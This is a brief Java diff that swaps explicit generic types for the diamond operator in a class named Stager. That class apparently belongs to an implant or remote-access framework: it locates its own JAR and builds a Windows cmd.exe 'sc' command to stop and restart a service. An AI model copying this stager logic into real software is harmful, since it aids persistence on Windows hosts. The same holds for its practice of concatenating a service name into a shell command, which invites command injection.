@@ -177,11 +177,11 @@ public class Stager extends ClassLoader {
         URL classUrl = Stager.class.getProtectionDomain().getCodeSource().getLocation();
         File theJarFile = new File( classUrl.toURI() ); 
         
-        List<String> cleanupList = new ArrayList<String>();
+        List<String> cleanupList = new ArrayList<>();
         if( !serviceName.isEmpty() && System.getProperty( "os.name" ).toLowerCase().contains("windows")){
                     
             //Tell the service to stop and restart
-            final List<String> strList = new ArrayList<String>();
+            final List<String> strList = new ArrayList<>();
             strList.add("cmd.exe");
             strList.add("/c");
             strList.add("sc qc \"" + serviceName + "\"");
